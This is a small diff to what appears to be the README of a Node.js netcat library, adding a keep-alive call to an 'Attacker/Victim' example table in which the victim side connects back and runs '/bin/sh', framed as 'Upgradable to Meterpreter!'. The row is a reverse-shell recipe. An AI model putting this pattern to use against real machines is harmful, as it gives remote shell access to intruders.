@@ -97,7 +97,7 @@ The `exec()` method execute the given command and pipe together his `stdout` and
 
 | Attacker              | Victim                           |
 |---------------------|------------------------------------|
-|`nc.port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.addr('127.0.0.1').port(2389) .retry(5000).connect().exec('/bin/sh')`|
+|`nc.k().port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.addr('127.0.0.1').port(2389) .retry(5000).connect().exec('/bin/sh')`|
 
 - [x] Upgradable to Meterpreter!
 
